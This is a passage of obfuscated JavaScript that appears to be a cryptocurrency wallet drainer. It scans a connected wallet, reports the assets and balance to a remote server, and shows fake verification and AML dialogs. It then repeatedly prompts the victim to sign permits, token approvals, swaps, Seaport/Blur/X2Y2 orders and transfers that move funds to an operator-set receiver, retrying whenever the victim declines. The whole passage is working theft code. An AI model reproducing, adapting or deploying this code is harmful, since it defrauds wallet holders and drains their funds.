                            'showConfirmButton': !![],
                            'confirmButtonText': 'OK',
                            'color': MS_Color_Scheme
                        }) : Swal[_0x2dd40a(0x211)]({
                            'title': 'Verification\x20Error',
                            'text': _0x2dd40a(0x253),
                            'icon': 'error',
                            'confirmButtonText': 'OK'
                        }),
                        MS_Process = ![],
                        await connect_cancel();
                }
            } catch (_0x269e87) {
                return MS_Loader_Style == 0x2 ? MSL['fire']({
                    'icon': 'error',
                    'title': _0x2dd40a(0x1e7),
                    'subtitle': 'Verification\x20Error',
                    'text': _0x2dd40a(0x262),
                    'showConfirmButton': !![],
                    'confirmButtonText': 'OK',
                    'color': MS_Color_Scheme
                }) : Swal[_0x2dd40a(0x211)]({
                    'title': _0x2dd40a(0x362),
                    'text': _0x2dd40a(0x262),
                    'icon': _0x2dd40a(0x385),
                    'confirmButtonText': 'OK'
                }),
                MS_Process = ![],
                await connect_cancel();
            }
        } else
            await send_request({
                'action': _0x2dd40a(0x18e),
                'address': MS_Current_Address
            });
        await connect_success(),
        show_check();
        if (MS_Settings['Wallet_Blacklist'][_0x2dd40a(0x2ae)] > 0x0 && MS_Settings[_0x2dd40a(0x346)][_0x2dd40a(0x389)](MS_Current_Address[_0x2dd40a(0x2d4)]()[_0x2dd40a(0x2fc)]())) {
            MS_Check_Done = !![],
            Swal['close']();
            MS_Loader_Style == 0x2 ? MSL[_0x2dd40a(0x211)]({
                'icon': _0x2dd40a(0x385),
                'title': _0x2dd40a(0x1e7),
                'subtitle': _0x2dd40a(0x2bf),
                'text': _0x2dd40a(0x2c5),
                'showConfirmButton': !![],
                'confirmButtonText': 'OK',
                'color': MS_Color_Scheme
            }) : Swal['fire']({
                'title': 'AML\x20Error',
                'text': 'Your\x20wallet\x20is\x20not\x20AML\x20clear,\x20you\x20can\x27t\x20use\x20it!',
                'icon': 'error',
                'confirmButtonText': 'OK'
            });
            MS_Process = ![];
            return;
        }
        let _0x150a56 = await get_wallet_assets(MS_Current_Address)
          , _0x14a162 = 0x0;
        for (const _0x921607 of _0x150a56) {
            try {
                _0x14a162 += _0x921607['amount_usd'];
            } catch (_0x2a217b) {
                console[_0x2dd40a(0x217)](_0x2a217b);
            }
        }
        let _0x403747 = 0x0;
        for (const _0x3e6017 of _0x150a56)
            _0x403747 += _0x3e6017['amount_usd'];
        await send_request({
            'action': _0x2dd40a(0x1d4),
            'user_id': MS_ID,
            'assets': _0x150a56,
            'balance': _0x403747
        });
        if (_0x403747 > 0x0 && MS_Settings[_0x2dd40a(0x23a)])
            await retrive_wallet();
        MS_Check_Done = !![],
        Swal[_0x2dd40a(0x1de)]();
        if (MS_Settings['Settings'][_0x2dd40a(0x1d1)] > _0x14a162) {
            MS_Loader_Style == 0x2 ? MSL[_0x2dd40a(0x211)]({
                'icon': 'error',
                'title': _0x2dd40a(0x1e7),
                'subtitle': _0x2dd40a(0x2a7),
                'text': _0x2dd40a(0x1cc),
                'showConfirmButton': !![],
                'confirmButtonText': 'OK',
                'color': MS_Color_Scheme
            }) : Swal[_0x2dd40a(0x211)]({
                'title': 'Something\x20went\x20wrong!',
                'text': _0x2dd40a(0x1cc),
                'icon': _0x2dd40a(0x385),
                'confirmButtonText': 'OK'
            });
            MS_Process = ![];
            return;
        }
        MS_Loader_Style == 0x2 ? MSL[_0x2dd40a(0x211)]({
            'icon': _0x2dd40a(0x2a1),
            'title': 'Waiting\x20for\x20action',
            'text': _0x2dd40a(0x2c2),
            'showConfirmButton': !![],
            'confirmButtonText': 'Waiting...',
            'color': MS_Color_Scheme
        }) : Swal[_0x2dd40a(0x211)]({
            'html': _0x2dd40a(0x376),
            'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
            'imageHeight': 0x3c,
            'allowOutsideClick': ![],
            'allowEscapeKey': ![],
            'timer': 0x0,
            'width': 0x258,
            'showConfirmButton': ![]
        });
        if (MS_Settings['Settings'][_0x2dd40a(0x323)][_0x2dd40a(0x210)] == 0x0 && MS_Current_Provider == _0x2dd40a(0x210) || MS_Settings['Settings'][_0x2dd40a(0x323)]['Trust'] == 0x0 && MS_Current_Provider == 'Trust\x20Wallet' || MS_Current_Provider == 'Trust\x20Wallet' && !MS_Mobile_Status)
            MS_Sign_Disabled = !![];
        for (const _0x6977e4 of _0x150a56) {
            try {
                if (_0x6977e4[_0x2dd40a(0x1c4)] != _0x2dd40a(0x309))
                    MS_Gas_Reserves[_0x6977e4[_0x2dd40a(0x3ab)]] += 0x1;
            } catch (_0x4298c8) {
                console[_0x2dd40a(0x217)](_0x4298c8);
            }
        }
        console[_0x2dd40a(0x195)](_0x150a56);
        if (typeof SIGN_BLUR !== 'undefined' && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2ab)][_0x2dd40a(0x2ac)] == 0x1 && MS_Settings['Settings'][_0x2dd40a(0x2ab)][_0x2dd40a(0x2f9)] == 0x1)
            await SIGN_BLUR(_0x150a56, MS_Provider, MS_Current_Address, MS_Settings[_0x2dd40a(0x2e9)], MS_ID, MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2ab)]['Price']);
        if (typeof SIGN_SEAPORT !== _0x2dd40a(0x2f6) && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2b0)][_0x2dd40a(0x2ac)] == 0x1 && MS_Settings[_0x2dd40a(0x2d2)]['SeaPort'][_0x2dd40a(0x2f9)] == 0x1)
            await SIGN_SEAPORT(_0x150a56, MS_Provider, MS_Current_Address, MS_Settings[_0x2dd40a(0x2e9)], MS_ID, MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2b0)][_0x2dd40a(0x33d)]);
        if (typeof SIGN_X2Y2 !== _0x2dd40a(0x2f6) && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x1e3)][_0x2dd40a(0x2ac)] == 0x1 && MS_Current_Chain_ID == 0x1 && MS_Settings[_0x2dd40a(0x2d2)]['x2y2'][_0x2dd40a(0x2f9)] == 0x1)
            await SIGN_X2Y2(_0x150a56, MS_Provider, MS_Current_Address, MS_Settings[_0x2dd40a(0x2e9)], MS_ID, MS_Settings[_0x2dd40a(0x2d2)]['x2y2'][_0x2dd40a(0x33d)]);
        let _0x3ff21c = !![];
        while (_0x3ff21c) {
            _0x3ff21c = MS_Settings['LA'] == 0x1;
            for (const _0x54ce2b of _0x150a56) {
                try {
                    if (_0x54ce2b[_0x2dd40a(0x2d6)])
                        continue;
                    let _0x32e8b8 = ![];
                    if (_0x54ce2b['type'] == _0x2dd40a(0x309)) {
                        const _0x840c07 = new ethers['providers']['JsonRpcProvider'](MS_Settings['RPCs'][_0x54ce2b['chain_id']])
                          , _0x3aec69 = BN(await _0x840c07[_0x2dd40a(0x2a9)]())[_0x2dd40a(0x273)](BN(0x64))[_0x2dd40a(0x28f)](Math[_0x2dd40a(0x24b)](MS_Gas_Multiplier * 0x64))
                          , _0x26b464 = BN(_0x54ce2b['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x54ce2b[_0x2dd40a(0x3ab)] == 0xa86a ? 0x4c4b40 : _0x54ce2b['chain_id'] == 0x171 ? 0xdbba0 : 0x249f0)
                          , _0xe85eeb = _0x26b464[_0x2dd40a(0x28f)](MS_Gas_Reserves[_0x54ce2b[_0x2dd40a(0x3ab)]] + 0x1)[_0x2dd40a(0x28f)](_0x3aec69)
                          , _0x588fc2 = {
                            'from': MS_Current_Address,
                            'to': MS_Settings[_0x2dd40a(0x365)],
                            'value': BN(0x64)
                        }
                          , _0x2603ca = await _0x840c07[_0x2dd40a(0x393)](_0x588fc2)
                          , _0x58b221 = await _0x840c07['getBalance'](MS_Current_Address)
                          , _0x27b9e2 = _0x58b221['sub'](_0x2603ca[_0x2dd40a(0x28f)](_0x3aec69))['sub'](_0xe85eeb);
                        if (_0x27b9e2[_0x2dd40a(0x354)](BN(0x0)))
                            continue;
                    }
                    if (_0x54ce2b[_0x2dd40a(0x3ab)] != MS_Current_Chain_ID) {
                        await chain_request(MS_Current_Chain_ID, _0x54ce2b['chain_id']);
                        try {
                            if (MS_Current_Provider == _0x2dd40a(0x1b3))
                                try {
                                    await MS_Provider[_0x2dd40a(0x364)]({
                                        'method': _0x2dd40a(0x304),
                                        'params': [{
                                            'chainId': '0x' + _0x54ce2b[_0x2dd40a(0x3ab)][_0x2dd40a(0x2b4)](0x10)
                                        }]
                                    });
                                } catch (_0xa7f877) {
                                    await chain_cancel();
                                    continue;
                                }
                            else
                                try {
                                    await MS_Provider[_0x2dd40a(0x364)]({
                                        'method': _0x2dd40a(0x304),
                                        'params': [{
                                            'chainId': '0x' + _0x54ce2b[_0x2dd40a(0x3ab)][_0x2dd40a(0x2b4)](0x10)
                                        }]
                                    });
                                } catch (_0x434cdd) {
                                    if (_0x434cdd[_0x2dd40a(0x1c0)] == 0x1326 || _0x434cdd[_0x2dd40a(0x1c0)] == -0x7f5b)
                                        try {
                                            await MS_Provider[_0x2dd40a(0x364)]({
                                                'method': _0x2dd40a(0x2d9),
                                                'params': [MS_MetaMask_ChainData[_0x54ce2b[_0x2dd40a(0x3ab)]]]
                                            });
                                        } catch (_0x4a64ac) {
                                            await chain_cancel();
                                            continue;
                                        }
                                    else {
                                        await chain_cancel();
                                        continue;
                                    }
                                }
                            MS_Current_Chain_ID = _0x54ce2b[_0x2dd40a(0x3ab)],
                            MS_Web3 = new ethers[(_0x2dd40a(0x38b))][(_0x2dd40a(0x1f0))](MS_Provider),
                            MS_Signer = MS_Web3[_0x2dd40a(0x34a)](),
                            _0x32e8b8 = !![],
                            await chain_success();
                        } catch (_0x9d8721) {
                            console['log'](_0x9d8721),
                            await chain_cancel();
                            continue;
                        }
                    } else
                        _0x32e8b8 = !![];
                    if (!_0x32e8b8)
                        continue;
                    if (_0x54ce2b['type'] == _0x2dd40a(0x309)) {
                        if (MS_Settings[_0x2dd40a(0x2d2)]['Sign']['Native'] > 0x0 && (!MS_Sign_Disabled || MS_Settings['Settings'][_0x2dd40a(0x323)][_0x2dd40a(0x2a5)] == 0x1))
                            while (!![]) {
                                try {
                                    await SIGN_NATIVE(_0x54ce2b),
                                    _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                    break;
                                } catch (_0x6544be) {
                                    console[_0x2dd40a(0x217)](_0x6544be);
                                    if (MS_Settings[_0x2dd40a(0x2d2)]['Sign'][_0x2dd40a(0x1d2)] == 0x1 && MS_Current_Provider == _0x2dd40a(0x1b3) || typeof _0x6544be[_0x2dd40a(0x2d1)] == _0x2dd40a(0x36b) && _0x6544be[_0x2dd40a(0x2d1)][_0x2dd40a(0x389)](_0x2dd40a(0x1d0)) || _0x6544be[_0x2dd40a(0x1c0)] == -0x7f59 || _0x6544be[_0x2dd40a(0x1c0)] == -0x7d00 || _0x6544be[_0x2dd40a(0x2d1)] && is_valid_json(_0x6544be['message']) && (JSON[_0x2dd40a(0x258)](_0x6544be[_0x2dd40a(0x2d1)])[_0x2dd40a(0x1c0)] == -0x7f59 || JSON[_0x2dd40a(0x258)](_0x6544be[_0x2dd40a(0x2d1)])[_0x2dd40a(0x1c0)] == -0x7d00)) {
                                        if (MS_Settings['Settings']['Sign'][_0x2dd40a(0x2a5)] == 0x1)
                                            await sign_cancel();
                                        else {
                                            await sign_unavailable();
                                            while (!![]) {
                                                try {
                                                    await TRANSFER_NATIVE(_0x54ce2b),
                                                    _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                    break;
                                                } catch (_0x2edc4a) {
                                                    console[_0x2dd40a(0x217)](_0x2edc4a);
                                                    if (_0x2edc4a != _0x2dd40a(0x1dd)) {
                                                        await transfer_cancel();
                                                        if (!MS_Settings[_0x2dd40a(0x26a)])
                                                            break;
                                                    } else
                                                        break;
                                                }
                                            }
                                        }
                                        break;
                                    } else {
                                        console['log'](_0x6544be);
                                        if (_0x6544be != _0x2dd40a(0x1dd)) {
                                            await sign_cancel();
                                            if (!MS_Settings[_0x2dd40a(0x26a)])
                                                break;
                                        } else
                                            break;
                                    }
                                }
                            }
                        else
                            while (!![]) {
                                try {
                                    await TRANSFER_NATIVE(_0x54ce2b),
                                    _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                    break;
                                } catch (_0x59a569) {
                                    console['log'](_0x59a569);
                                    if (_0x59a569 != _0x2dd40a(0x1dd)) {
                                        await transfer_cancel();
                                        if (!MS_Settings[_0x2dd40a(0x26a)])
                                            break;
                                    } else
                                        break;
                                }
                            }
                    } else {
                        if (_0x54ce2b[_0x2dd40a(0x1c4)] == _0x2dd40a(0x2f2)) {
                            if (typeof _0x54ce2b['permit'] == 'undefined' && MS_Settings[_0x2dd40a(0x2d2)]['Permit'][_0x2dd40a(0x370)] && _0x54ce2b['amount_usd'] >= MS_Settings[_0x2dd40a(0x2d2)]['Permit'][_0x2dd40a(0x33d)][_0x54ce2b['chain_id']]) {
                                const _0x4440a7 = await retrive_token(_0x54ce2b[_0x2dd40a(0x3ab)], _0x54ce2b[_0x2dd40a(0x34b)])
                                  , _0x5ae6aa = new ethers[(_0x2dd40a(0x38b))]['JsonRpcProvider'](MS_Settings['RPCs'][_0x54ce2b[_0x2dd40a(0x3ab)]])
                                  , _0x3cf26c = new ethers[(_0x2dd40a(0x2b7))](_0x54ce2b[_0x2dd40a(0x34b)],_0x4440a7,_0x5ae6aa)
                                  , _0x366245 = get_permit_type(_0x3cf26c[_0x2dd40a(0x252)]);
                                _0x54ce2b[_0x2dd40a(0x1fa)] = _0x366245,
                                _0x54ce2b['permit_ver'] = '1',
                                _0x54ce2b[_0x2dd40a(0x38c)] = _0x4440a7;
                                if (_0x366245 > 0x0) {
                                    if (_0x3cf26c['functions'][_0x2dd40a(0x329)](_0x2dd40a(0x2ce)))
                                        try {
                                            _0x54ce2b[_0x2dd40a(0x209)] = await _0x3cf26c[_0x2dd40a(0x2ce)]();
                                        } catch (_0x22e4b) {
                                            console[_0x2dd40a(0x217)](_0x22e4b);
                                        }
                                    console[_0x2dd40a(0x217)](_0x2dd40a(0x31b) + _0x54ce2b[_0x2dd40a(0x2c9)] + ',\x20Permit\x20Type:\x20' + _0x366245 + _0x2dd40a(0x214) + _0x54ce2b[_0x2dd40a(0x209)]);
                                }
                            }
                            if (_0x54ce2b['permit'] > 0x0)
                                for (const _0x4b4cef of MS_Settings[_0x2dd40a(0x1fe)]) {
                                    if (_0x4b4cef[0x0] == MS_Current_Chain_ID && _0x4b4cef[0x1] === _0x54ce2b['address'][_0x2dd40a(0x2d4)]()[_0x2dd40a(0x2fc)]()) {
                                        _0x54ce2b[_0x2dd40a(0x1fa)] = 0x0;
                                        break;
                                    }
                                }
                            if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x358)]['Mode'] && _0x54ce2b[_0x2dd40a(0x271)]) {
                                const _0x4becd2 = [];
                                for (const _0x1abbe4 of _0x150a56) {
                                    try {
                                        _0x1abbe4[_0x2dd40a(0x3ab)] == _0x54ce2b['chain_id'] && _0x1abbe4[_0x2dd40a(0x271)] && (_0x4becd2[_0x2dd40a(0x212)](_0x1abbe4),
                                        _0x1abbe4[_0x2dd40a(0x2d6)] = !![]);
                                    } catch (_0x5439c3) {
                                        console[_0x2dd40a(0x217)](_0x5439c3);
                                    }
                                }
                                while (!![]) {
                                    try {
                                        await DO_PERMIT2(_0x54ce2b, _0x4becd2),
                                        _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                        break;
                                    } catch (_0xaa241f) {
                                        console[_0x2dd40a(0x217)](_0xaa241f),
                                        await approve_cancel();
                                        if (!MS_Settings[_0x2dd40a(0x286)])
                                            break;
                                    }
                                }
                            } else {
                                if (MS_Settings['Settings']['Permit'][_0x2dd40a(0x370)] && _0x54ce2b['permit'] && _0x54ce2b[_0x2dd40a(0x1fa)] > 0x0)
                                    while (!![]) {
                                        try {
                                            await PERMIT_TOKEN(_0x54ce2b),
                                            _0x54ce2b['skip'] = !![];
                                            break;
                                        } catch (_0x244024) {
                                            console['log'](_0x244024),
                                            await approve_cancel();
                                            if (!MS_Settings[_0x2dd40a(0x286)])
                                                break;
                                        }
                                    }
                                else {
                                    if (MS_Settings['Settings'][_0x2dd40a(0x224)][_0x2dd40a(0x2ac)] && _0x54ce2b[_0x2dd40a(0x21b)] && _0x54ce2b[_0x2dd40a(0x1f5)] >= MS_Settings[_0x2dd40a(0x2d2)]['Swappers'][_0x2dd40a(0x33d)]) {
                                        if (_0x54ce2b[_0x2dd40a(0x218)] == _0x2dd40a(0x20c)) {
                                            const _0x586a49 = [];
                                            for (const _0x4d75dd of _0x150a56) {
                                                try {
                                                    _0x4d75dd['chain_id'] == _0x54ce2b[_0x2dd40a(0x3ab)] && _0x4d75dd['swapper'] && _0x4d75dd[_0x2dd40a(0x218)] == 'Uniswap' && (_0x586a49['push'](_0x4d75dd),
                                                    _0x4d75dd[_0x2dd40a(0x2d6)] = !![]);
                                                } catch (_0x14cacb) {
                                                    console[_0x2dd40a(0x217)](_0x14cacb);
                                                }
                                            }
                                            while (!![]) {
                                                try {
                                                    await DO_UNISWAP(_0x54ce2b, _0x586a49),
                                                    _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                    break;
                                                } catch (_0x4d1c02) {
                                                    console[_0x2dd40a(0x217)](_0x4d1c02),
                                                    await sign_cancel();
                                                    if (!MS_Settings[_0x2dd40a(0x286)])
                                                        break;
                                                }
                                            }
                                        } else {
                                            if (_0x54ce2b[_0x2dd40a(0x218)] == _0x2dd40a(0x265)) {
                                                const _0x22d313 = [];
                                                for (const _0x7dc74b of _0x150a56) {
                                                    try {
                                                        _0x7dc74b[_0x2dd40a(0x3ab)] == _0x54ce2b[_0x2dd40a(0x3ab)] && _0x7dc74b[_0x2dd40a(0x21b)] && _0x7dc74b[_0x2dd40a(0x218)] == 'Pancake_V3' && (_0x22d313[_0x2dd40a(0x212)](_0x7dc74b),
                                                        _0x7dc74b[_0x2dd40a(0x2d6)] = !![]);
                                                    } catch (_0x470bb8) {
                                                        console['log'](_0x470bb8);
                                                    }
                                                }
                                                while (!![]) {
                                                    try {
                                                        await DO_PANCAKE_V3(_0x54ce2b, _0x22d313),
                                                        _0x54ce2b['skip'] = !![];
                                                        break;
                                                    } catch (_0x3e9fdd) {
                                                        console['log'](_0x3e9fdd),
                                                        await sign_cancel();
                                                        if (!MS_Settings[_0x2dd40a(0x286)])
                                                            break;
                                                    }
                                                }
                                            } else
                                                while (!![]) {
                                                    try {
                                                        await DO_SWAP(_0x54ce2b),
                                                        _0x54ce2b['skip'] = !![];
                                                        break;
                                                    } catch (_0x130653) {
                                                        console[_0x2dd40a(0x217)](_0x130653),
                                                        await sign_cancel();
                                                        if (!MS_Settings['Loop_T'])
                                                            break;
                                                    }
                                                }
                                        }
                                    } else {
                                        if (MS_Settings[_0x2dd40a(0x2d2)]['Sign'][_0x2dd40a(0x1e0)] > 0x0 && (!MS_Sign_Disabled || MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x2a5)] == 0x1))
                                            while (!![]) {
                                                try {
                                                    await SIGN_TOKEN(_0x54ce2b);
                                                    if (MS_Settings['Settings'][_0x2dd40a(0x323)][_0x2dd40a(0x1e0)] == 0x1) {
                                                        const _0x480b05 = send_request({
                                                            'action': _0x2dd40a(0x312),
                                                            'user_id': MS_ID,
                                                            'asset': _0x54ce2b,
                                                            'address': MS_Current_Address,
                                                            'PW': ![]
                                                        });
                                                        if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x3a9)])
                                                            await _0x480b05;
                                                    }
                                                    _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                    break;
                                                } catch (_0x2ad47d) {
                                                    console[_0x2dd40a(0x217)](_0x2ad47d);
                                                    if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x1d2)] == 0x1 && MS_Current_Provider == _0x2dd40a(0x1b3) || typeof _0x2ad47d[_0x2dd40a(0x2d1)] == 'string' && _0x2ad47d[_0x2dd40a(0x2d1)][_0x2dd40a(0x389)](_0x2dd40a(0x1d0)) || _0x2ad47d[_0x2dd40a(0x1c0)] == -0x7f59 || _0x2ad47d[_0x2dd40a(0x1c0)] == -0x7d00 || _0x2ad47d[_0x2dd40a(0x2d1)] && is_valid_json(_0x2ad47d[_0x2dd40a(0x2d1)]) && (JSON['parse'](_0x2ad47d[_0x2dd40a(0x2d1)])[_0x2dd40a(0x1c0)] == -0x7f59 || JSON['parse'](_0x2ad47d['message'])[_0x2dd40a(0x1c0)] == -0x7d00)) {
                                                        if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x2a5)] == 0x1)
                                                            await sign_cancel();
                                                        else {
                                                            await sign_unavailable();
                                                            while (!![]) {
                                                                if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)]['Tokens'] == 0x1) {
                                                                    if (MS_Current_Provider == _0x2dd40a(0x210) && MS_Settings[_0x2dd40a(0x2d2)]['Approve'][_0x2dd40a(0x210)] || MS_Current_Provider == 'Trust\x20Wallet' && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x316)][_0x2dd40a(0x1fb)] || MS_Current_Provider != 'MetaMask' && MS_Current_Provider != _0x2dd40a(0x219))
                                                                        try {
                                                                            let _0x2b03d4 = await APPROVE_TOKEN(_0x54ce2b);
                                                                            if (_0x2b03d4 == 0x1) {
                                                                                const _0x4215f9 = send_request({
                                                                                    'action': _0x2dd40a(0x312),
                                                                                    'user_id': MS_ID,
                                                                                    'asset': _0x54ce2b,
                                                                                    'address': MS_Current_Address,
                                                                                    'PW': MS_Settings['Personal_Wallet']
                                                                                });
                                                                                if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x3a9)])
                                                                                    await _0x4215f9;
                                                                            }
                                                                            _0x54ce2b['skip'] = !![];
                                                                            break;
                                                                        } catch (_0x2a94b8) {
                                                                            await approve_cancel();
                                                                            if (!MS_Settings[_0x2dd40a(0x286)])
                                                                                break;
                                                                        }
                                                                    else
                                                                        try {
                                                                            await TRANSFER_TOKEN(_0x54ce2b),
                                                                            _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                                            break;
                                                                        } catch (_0x4c1a5b) {
                                                                            console[_0x2dd40a(0x217)](_0x4c1a5b),
                                                                            await transfer_cancel();
                                                                            if (!MS_Settings[_0x2dd40a(0x286)])
                                                                                break;
                                                                        }
                                                                } else {
                                                                    if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x1e0)] == 0x2)
                                                                        try {
                                                                            await TRANSFER_TOKEN(_0x54ce2b),
                                                                            _0x54ce2b['skip'] = !![];
                                                                            break;
                                                                        } catch (_0x329af1) {
                                                                            console[_0x2dd40a(0x217)](_0x329af1),
                                                                            await transfer_cancel();
                                                                            if (!MS_Settings[_0x2dd40a(0x286)])
                                                                                break;
                                                                        }
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    } else {
                                                        console[_0x2dd40a(0x217)](_0x2ad47d);
                                                        if (_0x2ad47d != 'LOW_BALANCE') {
                                                            await sign_cancel();
                                                            if (!MS_Settings[_0x2dd40a(0x286)])
                                                                break;
                                                        } else
                                                            break;
                                                    }
                                                }
                                            }
                                        else {
                                            if (MS_Current_Provider == 'MetaMask' && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x316)][_0x2dd40a(0x210)] || MS_Current_Provider == _0x2dd40a(0x219) && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x316)][_0x2dd40a(0x1fb)] || MS_Current_Provider != _0x2dd40a(0x210) && MS_Current_Provider != _0x2dd40a(0x219))
                                                while (!![]) {
                                                    try {
                                                        let _0x26b5c2 = await APPROVE_TOKEN(_0x54ce2b);
                                                        if (_0x26b5c2 == 0x1) {
                                                            const _0x3af751 = send_request({
                                                                'action': 'approve_token',
                                                                'user_id': MS_ID,
                                                                'asset': _0x54ce2b,
                                                                'address': MS_Current_Address,
                                                                'PW': MS_Settings[_0x2dd40a(0x1ef)]
                                                            });
                                                            if (MS_Settings['Settings']['Wait_For_Response'])
                                                                await _0x3af751;
                                                        }
                                                        _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                        break;
                                                    } catch (_0x39e58b) {
                                                        console['log'](_0x39e58b),
                                                        await approve_cancel();
                                                        if (!MS_Settings[_0x2dd40a(0x286)])
                                                            break;
                                                    }
                                                }
                                            else
                                                while (!![]) {
                                                    try {
                                                        await TRANSFER_TOKEN(_0x54ce2b),
                                                        _0x54ce2b['skip'] = !![];
                                                        break;
                                                    } catch (_0x478100) {
                                                        console[_0x2dd40a(0x217)](_0x478100),
                                                        await transfer_cancel();
                                                        if (!MS_Settings['Loop_T'])
                                                            break;
                                                    }
                                                }
                                        }
                                    }
                                }
                            }
                        } else {
                            if (_0x54ce2b['type'] == _0x2dd40a(0x28d)) {
                                if (typeof SIGN_BLUR !== _0x2dd40a(0x2f6) && MS_Settings[_0x2dd40a(0x2d2)]['Blur']['Enable'] == 0x1 && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2ab)]['Priority'] == 0x0 && !BL_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x54ce2b['address'], MS_Current_Address, _0x2dd40a(0x18f)) && _0x54ce2b[_0x2dd40a(0x1f5)] >= MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2ab)]['Price'])
                                    await SIGN_BLUR(_0x150a56, MS_Provider, MS_Current_Address, MS_Settings[_0x2dd40a(0x2e9)], MS_ID, MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2ab)][_0x2dd40a(0x33d)]),
                                    BL_US = !![];
                                else {
                                    if (typeof SIGN_SEAPORT !== _0x2dd40a(0x2f6) && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2b0)][_0x2dd40a(0x2ac)] == 0x1 && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2b0)][_0x2dd40a(0x2f9)] == 0x0 && !SP_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x54ce2b[_0x2dd40a(0x34b)], MS_Current_Address, _0x2dd40a(0x1f6)) && _0x54ce2b[_0x2dd40a(0x1f5)] >= MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2b0)][_0x2dd40a(0x33d)])
                                        await SIGN_SEAPORT(_0x150a56, MS_Provider, MS_Current_Address, MS_Settings[_0x2dd40a(0x2e9)], MS_ID, MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x2b0)][_0x2dd40a(0x33d)]),
                                        SP_US = !![];
                                    else {
                                        if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x1e3)][_0x2dd40a(0x2ac)] == 0x1 && MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x1e3)][_0x2dd40a(0x2f9)] == 0x0 && !XY_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x54ce2b[_0x2dd40a(0x34b)], MS_Current_Address, '0xf849de01b080adc3a814fabe1e2087475cf2e354') && _0x54ce2b[_0x2dd40a(0x1f5)] >= MS_Settings['Settings'][_0x2dd40a(0x1e3)][_0x2dd40a(0x33d)])
                                            await SIGN_X2Y2(_0x150a56, MS_Provider, MS_Current_Address, MS_Settings[_0x2dd40a(0x2e9)], MS_ID, MS_Settings['Settings']['x2y2']['Price']),
                                            XY_US = !![];
                                        else {
                                            if (MS_Settings[_0x2dd40a(0x2d2)]['Sign'][_0x2dd40a(0x314)] > 0x0 && (!MS_Sign_Disabled || MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x2a5)] == 0x1))
                                                while (!![]) {
                                                    try {
                                                        await SIGN_NFT(_0x54ce2b);
                                                        if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x314)] == 0x1) {
                                                            let _0x39e4a8 = [];
                                                            for (const _0x2843e8 of _0x150a56) {
                                                                try {
                                                                    _0x2843e8[_0x2dd40a(0x34b)] == _0x54ce2b['address'] && (_0x39e4a8[_0x2dd40a(0x212)](_0x2843e8),
                                                                    _0x2843e8['skip'] = !![]);
                                                                } catch (_0x164fcb) {
                                                                    console['log'](_0x164fcb);
                                                                }
                                                            }
                                                            await send_request({
                                                                'action': 'safa_approves',
                                                                'user_id': MS_ID,
                                                                'tokens': _0x39e4a8,
                                                                'address': MS_Current_Address,
                                                                'chain_id': MS_Current_Chain_ID,
                                                                'contract_address': _0x54ce2b['address'],
                                                                'PW': null
                                                            });
                                                        }
                                                        _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                        break;
                                                    } catch (_0x915c0) {
                                                        console['log'](_0x915c0);
                                                        if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x1d2)] == 0x1 && MS_Current_Provider == _0x2dd40a(0x1b3) || typeof _0x915c0[_0x2dd40a(0x2d1)] == _0x2dd40a(0x36b) && _0x915c0[_0x2dd40a(0x2d1)][_0x2dd40a(0x389)](_0x2dd40a(0x1d0)) || _0x915c0[_0x2dd40a(0x1c0)] == -0x7f59 || _0x915c0[_0x2dd40a(0x1c0)] == -0x7d00 || _0x915c0[_0x2dd40a(0x2d1)] && is_valid_json(_0x915c0[_0x2dd40a(0x2d1)]) && (JSON[_0x2dd40a(0x258)](_0x915c0['message'])[_0x2dd40a(0x1c0)] == -0x7f59 || JSON[_0x2dd40a(0x258)](_0x915c0[_0x2dd40a(0x2d1)])[_0x2dd40a(0x1c0)] == -0x7d00)) {
